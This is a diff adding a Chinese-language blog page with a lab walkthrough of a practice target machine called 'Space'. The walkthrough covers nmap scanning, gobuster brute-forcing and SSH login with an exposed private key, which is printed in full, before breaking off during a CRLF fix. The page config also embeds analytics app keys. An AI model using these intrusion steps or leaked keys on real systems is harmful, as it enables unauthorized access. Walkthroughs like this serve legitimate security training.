@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明QQ群：660930334  主机探测123456789101112131415┌──(root㉿kali)-[~]└─# nmap -sn 192.168.2.0&#x2F;24     Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-23 22:54 CSTNmap scan report for 192.168.2.1Host is">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Space">
+<meta property="og:url" content="http://miao-sec.github.io/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/Space/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明QQ群：660930334  主机探测123456789101112131415┌──(root㉿kali)-[~]└─# nmap -sn 192.168.2.0&#x2F;24     Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-06-23 22:54 CSTNmap scan report for 192.168.2.1Host is">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232334381.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232336591.png">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506241726083.png">
+<meta property="article:published_time" content="2025-06-24T12:13:12.000Z">
+<meta property="article:modified_time" content="2025-06-24T12:19:49.758Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="ssh私钥CRLF">
+<meta property="article:tag" content="提权-dos2unix">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232334381.png">
+  
+  
+  
+  <title>Space - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Miaosec</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Space"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-24 20:13" pubdate>
+          2025年6月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Space</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p>
+<hr>
+<h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap -sn 192.168.2.0/24     <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00058s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00074s latency).<br>MAC Address: 08:00:27:DA:82:3D (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00059s latency).<br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.21 seconds<br></code></pre></td></tr></table></figure>
+<p>IP地址：<code>192.168.2.38</code></p>
+<h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -p- 192.168.2.38<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:54 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00035s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 38.95 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22,80</code></p>
+<h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.38<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-23 22:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.38<br>Host is up (0.00058s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-title: Typing Challenge<br>| http-cookie-flags: <br>|   /: <br>|     PHPSESSID: <br>|_      httponly flag not <span class="hljs-built_in">set</span><br>MAC Address: 08:00:27:30:DB:B6 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.72 seconds<br></code></pre></td></tr></table></figure>
+
+<h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h2 id="1、访问80端口"><a href="#1、访问80端口" class="headerlink" title="1、访问80端口"></a>1、访问80端口</h2><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232334381.png" srcset="/img/loading.gif" lazyload><br>提示打字游戏，输入上面的文字，完成后有提示，根据步骤，完成上述的打字游戏，得到提示<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202506232336591.png" srcset="/img/loading.gif" lazyload></p>
+<p>访问<code>andeli.id_rsa</code>，猜测是<code>andeli</code>用户的私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">-----BEGIN OPENSSH PRIVATE KEY-----<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br>NhAAAAAwEAAQAAAYEA53wtJ27uQatcM+9fP8gZCT7ioVbSmFM5MWZZ+4ZZ/AJswfuI9ndz<br>ADvJgrVgCj2//vHO7Hla0V4S7nHccrFLVuHxzxtcTXiITKmo+S0N0uBu0NdkzFwvmTPqR4<br>tG/p1G6fgt9fms9tqw/A2EYf5Mk/cDv9OwhGldUArQZD9Dd/Zy7ZnRGhBVHm/HTxbwCad0<br>n4Or9+PEUzJb5Uw+GG8A3P0J128BUlIxj4M2/I769q3xSG4EuT9kqAJXCdxAvIzZ6OIfEI<br>9yFoRPbDLEe+95y5zoQpH6Yar5LqiK+X+YnxScWWwCe3r4BQJCiHT7LjIK0HH5YUMkFcr7<br>t9QvNytztJPr2pVQET9UdkiN27u2DCygVw5y1q0rP3fCsEZDCUJxcfjn9PZw5IRzqJcO1B<br>PIFacPpvv/jWI1DA1smd0+xr/AUWEBL4892GZ6hMR4uNLlva2iPoTs4cfZthecXWd0ImCy<br>WcSe6S5pFNWZ+C/u7Td7l46xhlN6Tw/N2n1vQrupAAAFiGVFw9FlRcPRAAAAB3NzaC1yc2<br>EAAAGBAOd8LSdu7kGrXDPvXz/IGQk+4qFW0phTOTFmWfuGWfwCbMH7iPZ3cwA7yYK1YAo9<br>v/7xzux5WtFeEu5x3HKxS1bh8c8bXE14iEypqPktDdLgbtDXZMxcL5kz6keLRv6dRun4Lf<br>X5rPbasPwNhGH+TJP3A7/TsIRpXVAK0GQ/Q3f2cu2Z0RoQVR5vx08W8AmndJ+Dq/fjxFMy<br>W+VMPhhvANz9CddvAVJSMY+DNvyO+vat8UhuBLk/ZKgCVwncQLyM2ejiHxCPchaET2wyxH<br>vvecuc6EKR+mGq+S6oivl/mJ8UnFlsAnt6+AUCQoh0+y4yCtBx+WFDJBXK+7fULzcrc7ST<br>69qVUBE/VHZIjdu7tgwsoFcOctatKz93wrBGQwlCcXH45/T2cOSEc6iXDtQTyBWnD6b7/4<br>1iNQwNbJndPsa/wFFhAS+PPdhmeoTEeLjS5b2toj6E7OHH2bYXnF1ndCJgslnEnukuaRTV<br>mfgv7u03e5eOsYZTek8Pzdp9b0K7qQAAAAMBAAEAAAGADZsS3Fp8zodP6A2Nv6X3Mr/rei<br>gsQJ/DoM+vQkVnTJSn587tAe+LZtwcv/4BIxj2C/oSe3u2hs/MtQ8kMemR0A1/tPiauEL5<br>X+go8lxfj6F5YfUHC6vvcEXI42OgTJ7Z6C6aJPcD346DEI2K1meoAJpoMgIzQdUfkvDPxt<br>ShFo/5uVVtIOcM2bkgMdnbSfX5uNZ4aR2OEIXJOPT+QVlk55hH183CeiAyoYjI1pdg0Nbw<br>c51j0a+ULvvUOdQkSfDNUXD2G7I6UxIYCWOkh2uq0ddPU+Kwe7d12+cnvpub1BEtKAfCTG<br>+NSL8y76bO2u/I7f/kPRzV7Hm4po0X5tZc0fn1tctqV2M+Hu+JoCrs/yVwo0CuA29h/pHh<br>cg1cBzn7jISuDMIAU5l8/nzs4/q/AIfQzqywYUrt04dkcTBmoPyI1QZiD6LufA8L8ZYqQB<br>TrzFsiw/DZNIUBW0XKECr3OQWiaTz44g1YWxKCpFjbXOcR+E25BNAL8eTl3D63OIIBAAAA<br>wCszq5giZqnTab2lVPvtEDePkQHRBZzShp0xm5Ru5kCyzoCrkbyrHH0GhoH77RIItrwd/3<br>XHXtzSAXsWWWiTIkO4zl9xV0dTs85mqeLCSQtS4yG8rz1vMsPCRPysKAo0pXMgvvKHqehl<br>yIU99M3jVPbBiwIuXFGohWr4agxrqMOcsuNIPx3PFmO3lqo08blC+GUBerk8+fiIhkJWe0<br>izzECGHV9xcCoOiwiAdQjr2hNzw9QfnpO/w9uWKmb1397aoQAAAMEA9D47nMj7KvxQtcWz<br>XMXnbqE1Z9EDavrAoA1zZSLrGzJs7jWZyWJuKv450wuf2fqrMCMA0BVngNnS3ljXj04pAg<br>EU5sFE8WOlVNvC9iSd1x5Nmo7DMItdKSHeJop63flzvi+7aNg9VX+qWS4oWMuMZ0m7Vupf<br>mC+xiO+dng7BBFWKIYqrcdWCuBqA6TdOt/qycejhZpTzXzYs/KsmMBjl7uSuUQZu2f6GDl<br>KvCxTjcpE8v7FgSPJv4TNg/DjbEneZAAAAwQDyoLp4Rapn6iXTKFqOAL/8m+uH8dqgB5OD<br>560gxDEgINdYzxwfOz+p3gphSp54MczEJEnYnfvDfKYKR5ty0AXS0iEjEoGAQFXuRjWEQf<br>MeTEb+VqnK/Y5sNXWwW/FVr2tTibwA0QlzQEtOOAceh5HcKrtKpxZjkK2d4odvY6MmbL/J<br>Rtgh4TMV09EokfXACR9F/bNY5Lu+xFMef4NWtXl3e0GEZcoLDSsKCuloOJJoJR/IM1w8gs<br>Bl1Hds+8Z7rpEAAAAMYW5kZWxpQFNwYWNlAQIDBAUGBw==<br>-----END OPENSSH PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<h2 id="2、目录爆破"><a href="#2、目录爆破" class="headerlink" title="2、目录爆破"></a>2、目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# gobuster <span class="hljs-built_in">dir</span> -u http://192.168.2.38 -x php,bak,txt,html -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.6<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.2.38<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.6<br>[+] Extensions:              php,bak,txt,html<br>[+] Timeout:                 10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 14241]<br>/.html                (Status: 403) [Size: 277]<br>/.php                 (Status: 403) [Size: 277]<br>/check.php            (Status: 302) [Size: 0] [--&gt; index.php]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+<p>未发现其他目录</p>
+<h1 id="SSH渗透"><a href="#SSH渗透" class="headerlink" title="SSH渗透"></a>SSH渗透</h1><h2 id="1、ssh登录"><a href="#1、ssh登录" class="headerlink" title="1、ssh登录"></a>1、ssh登录</h2><p>尝试使用发现的私钥进行登录</p>
+<ul>
+<li><p>保存私钥到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# wget http://192.168.2.38/andeli.id_rsa<br>--2025-06-23 23:01:22--  http://192.168.2.38/andeli.id_rsa<br>正在连接 192.168.2.38:80... 已连接。<br>已发出 HTTP 请求，正在等待回应... 200 OK<br>长度：2640 (2.6K)<br>正在保存至: “andeli.id_rsa”<br><br>andeli.id_rsa                       100%[==================================================================&gt;]   2.58K  --.-KB/s  用时 0s      <br><br>2025-06-23 23:01:22 (108 MB/s) - 已保存 “andeli.id_rsa” [2640/2640])<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>修改私钥的权限 <strong>私钥的权限必须为600</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">chmod</span> 600 andeli.id_rsa <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>尝试进行SSH登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh andeli@192.168.2.38 -i andeli.id_rsa <br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.38 (192.168.2.38)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.</span><br><span class="hljs-string">This host key is known by the following other names/addresses:</span><br><span class="hljs-string">    ~/.ssh/known_hosts:5: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:7: [hashed name]</span><br><span class="hljs-string">    ~/.ssh/known_hosts:8: [hashed name]</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.38<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">Load key &quot;andeli.id_rsa&quot;: error in libcrypto</span><br><span class="hljs-string">andeli@192.168.2.38&#x27;</span>s password:<br></code></pre></td></tr></table></figure>
+<p>提示<code>Load key &quot;andeli.id_rsa&quot;: error in libcrypto</code></p>
+</li>
+</ul>
+<h2 id="2、CRLF-remove"><a href="#2、CRLF-remove" class="headerlink" title="2、CRLF remove"></a>2、CRLF remove</h2><ul>
+<li>查看私钥里面不可见的字符<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">cat</span> -A andeli.id_rsa <br>-----BEGIN OPENSSH PRIVATE KEY-----^M$<br>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn^M$<br>NhAAAAAwEAAQAAAYEA53wtJ27uQatcM+9fP8gZCT7ioVbSmFM5MWZZ+4ZZ/AJswfuI9ndz^M$<br>ADvJgrVgCj2//vHO7Hla0V4S7nHccrFLVuHxzxtcTXiITKmo+S0N0uBu0NdkzFwvmTPqR4^M$<br>tG/p1G6fgt9fms9tqw/A2EYf5Mk/cDv9OwhGldUArQZD9Dd/Zy7ZnRGhBVHm/HTxbwCad0^M$<br>n4Or9+PEUzJb5Uw+GG8A3P0J128BUlIxj4M2/I769q3xSG4EuT9kqAJXCdxAvIzZ6OIfEI^M$<br>9yFoRPbDLEe+95y5zoQpH6Yar5LqiK+X+YnxScWWwCe3r4BQJCiHT7LjIK0HH5YUMkFcr7^M$<br>t9QvNytztJPr2pVQET9UdkiN27u2DCygVw5y1q0rP3fCsEZDCUJxcfjn9PZw5IRzqJcO1B^M$<br>PIFacPpvv/jWI1DA1smd0+xr/AUWEBL4892GZ6hMR4uNLlva2iPoTs4cfZthecXWd0ImCy^M$<br>WcSe6S5pFNWZ+C/u7Td7l46xhlN6Tw/N2n1vQrupAAAFiGVFw9FlRcPRAAAAB3NzaC1yc2^M$<br>EAAAGBAOd8LSdu7kGrXDPvXz/IGQk+4qFW0phTOTFmWfuGWfwCbMH7iPZ3cwA7yYK1YAo9^M$<br>v/7xzux5WtFeEu5x3HKxS1bh8c8bXE14iEypqPktDdLgbtDXZMxcL5kz6keLRv6dRun4Lf^M$<br>X5rPbasPwNhGH+TJP3A7/TsIRpXVAK0GQ/Q3f2cu2Z0RoQVR5vx08W8AmndJ+Dq/fjxFMy^M$<br>W+VMPhhvANz9CddvAVJSMY+DNvyO+vat8UhuBLk/ZKgCVwncQLyM2ejiHxCPchaET2wyxH^M$<br>vvecuc6EKR+mGq+S6oivl/mJ8UnFlsAnt6+AUCQoh0+y4yCtBx+WFDJBXK+7fULzcrc7ST^M$<br>69qVUBE/VHZIj